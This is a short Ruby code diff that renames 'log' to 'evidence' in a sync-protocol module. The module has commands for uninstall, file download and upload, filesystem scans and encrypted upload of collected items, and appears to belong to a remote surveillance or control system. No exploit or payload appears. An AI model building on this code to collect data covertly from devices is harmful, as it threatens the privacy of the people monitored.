@@ -32,7 +32,7 @@ module Command
   PROTO_UNINSTALL  = 0x0a       # Uninstall command
   PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
   PROTO_UPLOAD     = 0x0d       # A file to be saved
-  PROTO_LOG        = 0x09       # Upload of a log
+  PROTO_EVIDENCE   = 0x09       # Upload of a log
   PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
 
   # the commands are depicted here: http://rcs-dev/trac/wiki/RCS_Sync_Proto_Rest
@@ -256,15 +256,15 @@ module Command
   # Protocol Log
   # ->  Crypt_K ( PROTO_LOG [ size, content ] )   
   # <-  Crypt_K ( PROTO_OK | PROTO_NO )   
-  def send_logs(logs)
+  def send_evidences(evidences)
 
-    return if logs.empty?
+    return if evidences.empty?
     
     # take the first log
-    log = logs.shift
+    evidence = evidences.shift
     
     # prepare the message
-    message = [PROTO_LOG].pack('i') + [log.size].pack('i') + log.content
+    message = [PROTO_EVIDENCE].pack('i') + [evidence.size].pack('i') + evidence.content
     
     enc_msg = aes_encrypt(message, @session_key)
     # send the message and receive the response
@@ -272,13 +272,13 @@ module Command
     resp = aes_decrypt(resp, @session_key)
     
     if resp.unpack('i') == [PROTO_OK] then
-      trace :info, "LOG -- [#{log.name}] #{log.size} bytes sent. #{logs.size} left"
+      trace :info, "EVIDENCE -- [#{evidence.name}] #{evidence.size} bytes sent. #{evidences.size} left"
     else
-      trace :info, "LOG -- problems from server"
+      trace :info, "EVIDENCE -- problems from server"
     end
    
     # recurse for the next log to be sent
-    send_logs logs unless logs.empty?
+    send_evidences evidences unless evidences.empty?
   end
   
   
